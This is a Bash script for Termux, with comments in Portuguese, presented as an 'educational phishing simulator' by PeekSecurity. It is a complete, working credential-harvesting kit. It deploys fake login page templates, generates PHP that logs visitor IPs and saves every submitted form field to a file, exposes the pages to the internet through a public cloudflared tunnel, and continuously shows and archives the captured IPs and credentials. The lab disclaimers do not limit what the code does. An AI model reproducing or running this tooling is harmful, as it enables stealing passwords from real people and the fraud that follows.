#!/data/data/com.termux/files/usr/bin/bash

# =====================================
# PS.Thumbnails - PeekSecurity
# Autor: Peek | @PeekSecurity
# GitHub: https://psecurity.github.io/PSecurity
# =====================================
# Ferramenta Educacional para Laboratório de Pentest - Versão 3.0
# Uso exclusivamente autorizado em ambientes controlados.
# =====================================

# ===================== CONFIGURAÇÕES =====================
HOST="127.0.0.1"
PORT="8080"
SITES_DIR=".sites"          # Onde ficam os templates
WWW_DIR=".server/www"       # Diretório web temporário
SERVER_DIR=".server"         # Binários e logs
CAPTURE_DIR=".server/captures"  # Onde salvar IPs e credenciais

# Cores ANSI
RED="\033[1;31m"
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
MAGENTA="\033[1;35m"
CYAN="\033[1;36m"
WHITE="\033[1;37m"
RESET="\033[0m"

# ===================== FUNÇÕES AUXILIARES =====================
banner() {
    clear
    echo -e "${RED}"
    echo "  ██████  ██▓███   ▄▄▄       ██▀███   ██ ▄█▀"
    echo " ▒██    ▒ ▓██░  ██▒▒████▄    ▓██ ▒ ██▒ ██▄█▒"
    echo " ░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██ ░▄█ ▒▓███▄░"
    echo "   ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██▀▀█▄  ▓██ █▄"
    echo " ▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒░██▓ ▒██▒▒██▒ █▄"
    echo " ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒ ▒▒ ▓▒"
    echo " ░ ░▒  ░ ░░▒ ░       ▒   ▒▒ ░  ░▒ ░ ▒░░ ░▒ ▒░"
    echo " ░  ░  ░  ░░         ░   ▒     ░░   ░ ░ ░░ ░"
    echo "       ░                 ░  ░   ░     ░  ░"
    echo -e "${RESET}"
    echo -e "${CYAN}    Laboratório Educacional - Phishing Simulator v3.0${RESET}"
    echo -e "${YELLOW}    [*] Use apenas em redes autorizadas.${RESET}\n"
}

dependencies() {
    echo -e "${GREEN}[+] Verificando dependências...${RESET}"
    local deps=("php" "curl" "wget" "unzip")
    local missing=()
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            missing+=("$dep")
        fi
    done
    if [[ ${#missing[@]} -eq 0 ]]; then
        echo -e "${GREEN}[+] Todas as dependências já estão instaladas.${RESET}"
        return 0
    fi
    echo -e "${YELLOW}[!] Pacotes faltando: ${missing[*]}${RESET}"
    echo -e "${GREEN}[+] Instalando...${RESET}"
    pkg update -y && pkg install -y "${missing[@]}"
    if [[ $? -ne 0 ]]; then
        echo -e "${RED}[!] Falha na instalação. Instale manualmente.${RESET}"
        exit 1
    fi
}

setup_dirs() {
    mkdir -p "$WWW_DIR" "$CAPTURE_DIR" "$SERVER_DIR"
    rm -rf "$WWW_DIR"/*   # Limpa execução anterior
}

# Download do cloudflared para arquitetura correta
install_cloudflared() {
    if [[ -x "$SERVER_DIR/cloudflared" ]]; then
        echo -e "${GREEN}[+] Cloudflared já está presente.${RESET}"
        return 0
    fi
    echo -e "${GREEN}[+] Baixando cloudflared...${RESET}"
    local arch=$(uname -m)
    local url=""
    case "$arch" in
        aarch64) url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" ;;
        armv7l|armv8l) url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm" ;;
        x86_64) url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" ;;
        i686) url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" ;;
        *) echo -e "${RED}[!] Arquitetura não suportada: $arch${RESET}"; exit 1 ;;
    esac
    wget -q --show-progress -O "$SERVER_DIR/cloudflared" "$url"
    if [[ -f "$SERVER_DIR/cloudflared" ]]; then
        chmod +x "$SERVER_DIR/cloudflared"
        echo -e "${GREEN}[+] Cloudflared instalado com sucesso.${RESET}"
    else
        echo -e "${RED}[!] Falha no download.${RESET}"
        exit 1
    fi
}

kill_pid() {
    # Mata processos PHP e cloudflared que estejam rodando
    pkill -f "php -S $HOST:$PORT" 2>/dev/null
    pkill -f "$SERVER_DIR/cloudflared" 2>/dev/null
    rm -f "$SERVER_DIR/cloudflared.log" 2>/dev/null
}

# Obtém URL pública do cloudfared usando sua API
get_cloudflared_url() {
    local log_file="$1"
    local timeout=15
    local count=0
    while [[ $count -lt $timeout ]]; do
        if [[ -f "$log_file" ]]; then
            local url=$(grep -o 'https://[-a-zA-Z0-9.]*\.trycloudflare.com' "$log_file" | head -1)
            if [[ -n "$url" ]]; then
                echo "$url"
                return 0
            fi
        fi
        sleep 1
        ((count++))
    done
    return 1
}

start_php_server() {
    echo -e "${GREEN}[+] Iniciando servidor PHP em $HOST:$PORT...${RESET}"
    cd "$WWW_DIR" || exit 1
    php -S "$HOST":"$PORT" > /dev/null 2>&1 &
    PHP_PID=$!
    sleep 2
    if ! kill -0 $PHP_PID 2>/dev/null; then
        echo -e "${RED}[!] Falha ao iniciar servidor PHP.${RESET}"
        exit 1
    fi
    cd - >/dev/null
}

start_cloudflared() {
    echo -e "${GREEN}[+] Iniciando túnel cloudflared...${RESET}"
    "$SERVER_DIR/cloudflared" tunnel --url "http://$HOST:$PORT" --logfile "$SERVER_DIR/cloudflared.log" > /dev/null 2>&1 &
    CF_PID=$!
    sleep 3
    local tunnel_url=$(get_cloudflared_url "$SERVER_DIR/cloudflared.log")
    if [[ -z "$tunnel_url" ]]; then
        echo -e "${RED}[!] Não foi possível obter URL do cloudflared.${RESET}"
        kill_pid
        exit 1
    fi
    echo -e "${GREEN}[+] Túnel ativo: ${CYAN}$tunnel_url${RESET}"
    echo "$tunnel_url" > "$SERVER_DIR/current_url.txt"
}

# Copia os arquivos do template escolhido para WWW_DIR
deploy_template() {
    local site="$1"
    if [[ ! -d "$SITES_DIR/$site" ]]; then
        echo -e "${RED}[!] Template '$site' não encontrado.${RESET}"
        exit 1
    fi
    echo -e "${GREEN}[+] Implantando template: $site${RESET}"
    cp -r "$SITES_DIR/$site"/* "$WWW_DIR/"
    # Garante que ip.php e post.php estejam presentes (se não, cria padrão)
    if [[ ! -f "$WWW_DIR/ip.php" ]]; then
        cat > "$WWW_DIR/ip.php" <<EOF
<?php
if (!empty(\$_SERVER['HTTP_CLIENT_IP'])) {
    \$ip = \$_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty(\$_SERVER['HTTP_X_FORWARDED_FOR'])) {
    \$ip = \$_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    \$ip = \$_SERVER['REMOTE_ADDR'];
}
file_put_contents("ip.txt", "IP: " . \$ip . " - " . date("Y-m-d H:i:s") . "\n", FILE_APPEND);
?>
EOF
    fi
    if [[ ! -f "$WWW_DIR/post.php" ]]; then
        cat > "$WWW_DIR/post.php" <<EOF
<?php
if (!empty(\$_POST)) {
    \$data = "[" . date("Y-m-d H:i:s") . "] ";
    foreach (\$_POST as \$key => \$value) {
        \$data .= ucfirst(\$key) . ": " . \$value . " | ";
    }
    file_put_contents("usernames.txt", \$data . "\n", FILE_APPEND);
}
header("Location: https://www.google.com");
exit;
?>
EOF
    fi
}

monitor_capture() {
    echo -e "${GREEN}[+] Monitorando capturas (IP e credenciais)...${RESET}"
    echo -e "${YELLOW}    Pressione Ctrl+C para interromper.${RESET}\n"
    while true; do
        if [[ -f "$WWW_DIR/ip.txt" ]]; then
            echo -e "${RED}[!] IP capturado:${RESET}"
            cat "$WWW_DIR/ip.txt"
            cat "$WWW_DIR/ip.txt" >> "$CAPTURE_DIR/ip_$(date +%Y%m%d_%H%M%S).txt"
            rm -f "$WWW_DIR/ip.txt"
        fi
        if [[ -f "$WWW_DIR/usernames.txt" ]]; then
            echo -e "${RED}[!] Credenciais capturadas:${RESET}"
            cat "$WWW_DIR/usernames.txt"
            cat "$WWW_DIR/usernames.txt" >> "$CAPTURE_DIR/creds_$(date +%Y%m%d_%H%M%S).txt"
            rm -f "$WWW_DIR/usernames.txt"
        fi
        sleep 1
    done
}

# Menu de seleção de templates (lê diretórios em .sites)
list_templates() {
    local templates=()
    if [[ -d "$SITES_DIR" ]]; then
        for d in "$SITES_DIR"/*/; do
            if [[ -d "$d" ]]; then
                templates+=("$(basename "$d")")
            fi
        done
    fi
    if [[ ${#templates[@]} -eq 0 ]]; then
        echo -e "${RED}[!] Nenhum template encontrado em $SITES_DIR${RESET}"
        echo -e "${YELLOW}    Crie subpastas com páginas de phishing.${RESET}"
        exit 1
    fi
    echo -e "${CYAN}========== TEMPLATES DISPONÍVEIS ==========${RESET}"
    for i in "${!templates[@]}"; do
        echo -e "  ${GREEN}[$((i+1))]${RESET} ${templates[$i]}"
    done
    echo -e "  ${RED}[0] Sair${RESET}"
    echo -ne "${YELLOW}Escolha um template: ${RESET}"
    read -r choice
    if [[ "$choice" == "0" ]]; then
        echo -e "${GREEN}[+] Saindo...${RESET}"
        exit 0
    elif [[ "$choice" =~ ^[0-9]+$ ]] && [[ $choice -ge 1 ]] && [[ $choice -le ${#templates[@]} ]]; then
        SELECTED_TEMPLATE="${templates[$((choice-1))]}"
    else
        echo -e "${RED}[!] Opção inválida.${RESET}"
        exit 1
    fi
}

tunnel_choice() {
    echo -e "\n${CYAN}========== MÉTODO DE EXPOSIÇÃO ==========${RESET}"
    echo -e "  ${GREEN}[1]${RESET} Localhost (apenas rede local)"
    echo -e "  ${GREEN}[2]${RESET} Cloudflared (túnel público)"
    echo -ne "${YELLOW}Escolha: ${RESET}"
    read -r tun_choice
    case "$tun_choice" in
        1) TUNNEL="localhost" ;;
        2) TUNNEL="cloudflared" ;;
        *) echo -e "${RED}[!] Opção inválida. Usando localhost.${RESET}"; TUNNEL="localhost" ;;
    esac
}

main() {
    trap 'kill_pid; echo -e "\n${RED}[!] Programa interrompido.${RESET}"; exit 0' INT TERM
    banner
    dependencies
    setup_dirs
    install_cloudflared
    list_templates
    tunnel_choice
    deploy_template "$SELECTED_TEMPLATE"
    start_php_server
    if [[ "$TUNNEL" == "cloudflared" ]]; then
        start_cloudflared
        url=$(cat "$SERVER_DIR/current_url.txt" 2>/dev/null)
        echo -e "${GREEN}[+] URL pública: ${CYAN}$url${RESET}"
    else
        echo -e "${GREEN}[+] Servidor local: ${CYAN}http://$HOST:$PORT${RESET}"
    fi
    monitor_capture
}

# Execução principal
main
